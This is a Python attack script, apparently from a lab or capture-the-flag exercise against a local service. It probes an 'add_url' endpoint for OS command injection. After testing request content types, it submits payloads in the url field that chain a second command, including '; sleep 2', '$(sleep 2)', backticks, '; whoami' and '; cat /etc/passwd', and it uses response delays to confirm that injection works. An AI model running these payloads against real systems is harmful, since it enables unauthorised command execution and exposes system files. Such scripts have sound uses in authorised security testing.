import requests
import time

BASE_URL = "http://127.0.0.1:32998/add_url"

def test_request(payload, content_type, description):
    """Test with different content types"""
    headers = {"Content-Type": content_type} if content_type else {}
    
    if content_type == "application/x-www-form-urlencoded":
        # Form data 
        data = f"url={payload}"
        start = time.time()
        try:
            resp = requests.post(BASE_URL, headers=headers, data=data, timeout=10)
        except Exception as e:
            resp = type('obj', (object,), {'status_code': 'ERROR', 'text': str(e)})
    elif content_type == "application/json":
        data = {"url": payload}
        start = time.time()
        try:
            resp = requests.post(BASE_URL, headers=headers, json=data, timeout=10)
        except Exception as e:
            resp = type('obj', (object,), {'status_code': 'ERROR', 'text': str(e)})
    else:
        # No content type specified - try form data
        data = {"url": payload}
        start = time.time()
        try:
            resp = requests.post(BASE_URL, data=data, timeout=10)
        except Exception as e:
            resp = type('obj', (object,), {'status_code': 'ERROR', 'text': str(e)})
    
    elapsed = time.time() - start
    return elapsed, resp.status_code, resp.text[:500]

print("[+] Testing different request formats...")

# Test with different content types
formats = [
    ("application/x-www-form-urlencoded", "form-urlencoded"),
    ("application/json", "JSON"),
    (None, "no Content-Type"),
]

test_payload = "test.com"

for ct, desc in formats:
    elapsed, status, text = test_request(test_payload, ct, desc)
    print(f"\n[FORMAT TEST] {desc}")
    print(f"  Content-Type: {ct}")
    print(f"  Status: {status} | Time: {elapsed:.3f}s")
    if text:
        print(f"  Response: {text[:300]}")
    
    # If we got a 200 or a specific error, try injection with this format
    if status != 500:
        print(f"  [+] Potential working format found!")

# Now let's try injection with form data which appears more standard
print("\n" + "="*60)
print("[+] Testing command injection with form data format...")
print("="*60)

headers = {"Content-Type": "application/x-www-form-urlencoded"}

injection_tests = [
    "https://example.com",
    "https://example.com; sleep 2",
    "https://example.com && sleep 2",
    "https://example.com | sleep 2",
    "https://example.com; whoami",
    "https://example.com; cat /etc/passwd",
    "'; sleep 2;",
    "`sleep 2`",
    "$(sleep 2)",
]

for payload in injection_tests:
    data = f"url={payload}"
    start = time.time()
    try:
        resp = requests.post(BASE_URL, headers=headers, data=data, timeout=10)
        elapsed = time.time() - start
        print(f"\n[TEST] {payload[:50]}")
        print(f"  Status: {resp.status_code} | Time: {elapsed:.3f}s")
        if resp.status_code != 500:
            print(f"  Response: {resp.text[:500]}")
        if elapsed >= 1.5:
            print(f"  [!] DELAY DETECTED - injection working!")
    except requests.exceptions.Timeout:
        print(f"[TIMEOUT] {payload[:50]} - delay detected!")
    except Exception as e:
        print(f"[ERROR] {payload[:50]}: {e}")

